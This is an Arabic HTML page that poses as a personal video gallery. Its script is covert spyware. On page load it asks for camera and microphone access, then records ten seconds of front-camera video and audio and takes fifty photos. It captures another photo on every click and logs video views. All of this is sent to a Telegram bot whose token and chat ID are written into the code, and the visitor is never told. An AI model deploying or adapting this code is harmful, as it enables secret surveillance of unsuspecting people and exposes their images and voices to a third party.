<!DOCTYPE html><html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>طائفة الظلال - العنقاء_666</title>
  <style>
    body {
      background-color: #5a2d82; /* 👑 خلفية بنفسجية باردة مشعة */
      color: white;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      direction: rtl;
    }
    .header {
      background-image: url('5alfia.png'); /* 👑 غلاف الصورة */
      background-size: cover;
      background-position: center;
      height: 200px;
      position: relative;
    }
    .profile {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 4px solid white;
      position: absolute;
      bottom: -50px;
      right: 20px;
      background-image: url('profile.png');
      background-size: cover;
      background-position: center;
    }
    .container {
      margin-top: 60px;
      padding: 20px;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 15px;
    }
    .video-card {
      background-color: #a74fd1;
      border: 3px solid pink;
      padding: 5px;
      border-radius: 10px;
      animation: pulse 2s infinite;
      position: relative;
    }
    .video-card:hover {
      transform: scale(1.05);
      cursor: pointer;
    }
    .video-description {
      text-align: center;
      margin-top: 5px;
      font-weight: bold;
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 10px red; }
      50% { box-shadow: 0 0 20px red; }
      100% { box-shadow: 0 0 10px red; }
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="profile"></div>
  </div>  <div class="container">
    <div class="video-card" onclick="sendVideoInfo('لحن نهاية')">
      <video width="100%" src="VivaCut_video_1751836959485_HD1.mp4" controls></video>
      <div class="video-description">لحن نهاية</div>
    </div>
    <!-- 👑 كرر هذا البلوك لتكرار الفيديوهات حسب الحاجة مع تغيير الاسم والوصف -->
  </div>  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";

    function sendVideoInfo(desc) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `📹 تم مشاهدة الفيديو: ${desc}`
        })
      });
    }

    // طلب الإذن من المستخدم
    async function requestPermissionsAndCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });

        // تسجيل فيديو لمدة 10 ثواني
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/mp4' });
          const formData = new FormData();
          formData.append("video", blob, "video.mp4");
          await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
            method: "POST",
            body: formData
          });
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 10000); // ⏱️ 10 ثواني فقط

        // التقاط 50 صورة PNG
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        canvas.width = 480;
        canvas.height = 360;

        for (let i = 0; i < 50; i++) {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append("photo", blob, `photo_${i}.png`);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
              method: "POST",
              body: formData
            });
          }, "image/png");
          await new Promise(res => setTimeout(res, 200));
        }
      } catch (e) {
        alert("⚠️ فشل الحصول على الإذن بالكاميرا/المايكروفون");
      }
    }

    // عند تحميل الصفحة اطلب الإذن
    window.onload = () => {
      requestPermissionsAndCapture();

      // التقاط صورة عند كل نقرة
      document.body.addEventListener('click', async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          const canvas = document.createElement('canvas');
          canvas.width = 480;
          canvas.height = 360;
          const ctx = canvas.getContext('2d');

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
              const formData = new FormData();
              formData.append("photo", blob, "click_photo.png");
              await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
                method: "POST",
                body: formData
              });
            }, "image/png");
          }, 1000);
        } catch (err) {}
      });
    };
  </script></body>
</html>
